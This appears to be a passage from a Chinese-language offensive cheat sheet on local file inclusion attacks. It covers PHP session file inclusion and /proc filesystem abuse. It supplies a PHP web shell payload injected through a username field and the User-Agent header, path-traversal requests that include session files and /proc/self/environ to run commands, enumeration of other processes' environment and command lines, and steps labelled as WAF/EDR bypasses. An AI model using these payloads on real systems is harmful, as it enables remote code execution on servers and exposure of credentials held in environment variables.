**前置条件：** 存在LFI漏洞；可控制Session内容；知道Session路径

**攻击链：**

**1. 1. 探测Session路径**
_探测Session存储路径_
```
# Linux默认路径
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```

**2. 2. 控制Session内容**
_控制Session内容_
```
# 通过用户输入控制Session
# 例如用户名、个人简介等
username: <?php system($_GET['c']); ?>

# 或通过Cookie
Set-Cookie: PHPSESSID=malicious
```

**3. 3. 包含Session文件**
_包含Session文件执行代码_
```
# 包含Session文件
?file=/var/lib/php/sessions/sess_abc123&c=id

# 或使用相对路径
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```

**4. 4. Session竞争条件**
_利用Session竞争条件_
```
# 利用Session竞争
# 1. 持续写入恶意代码到Session
# 2. 同时包含Session文件
# 3. 在Session被清理前执行
```

**WAF/EDR 绕过变体：**

**1. Session ID预测**
_预测Session ID_
```
# 尝试预测Session ID
# 常见模式: md5(ip.time.random)
# 暴力枚举Session ID
```

---

### Proc文件系统利用  `lfi-proc`
利用/proc文件系统进行LFI攻击
子类：**Proc文件系统** · tags: `lfi` `proc` `linux` `environ`

**前置条件：** 存在LFI漏洞；Linux系统；/proc可访问

**攻击链：**

**1. 1. 读取进程信息**  _[linux]_
_读取当前进程信息_
```
# 当前进程信息
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

**2. 2. 读取环境变量**  _[linux]_
_读取环境变量执行代码_
```
?file=../../../proc/self/environ

# 在User-Agent中注入
User-Agent: <?php system($_GET['c']); ?>

# 包含执行
?file=../../../proc/self/environ&c=id
```

**3. 3. 通过fd读取日志**  _[linux]_
_通过fd读取日志_
```
# fd文件描述符
/proc/self/fd/10
/proc/self/fd/20

# 尝试不同编号找到日志
?file=../../../proc/self/fd/10
```

**4. 4. 读取其他进程**  _[linux]_
_读取其他进程信息_
```
# 枚举进程
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# 暴力枚举
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```

**WAF/EDR 绕过变体：**

**1. 使用self**  _[linux]_
_使用self引用_
```
?file=/proc/self/environ
?file=proc/self/environ
```

---
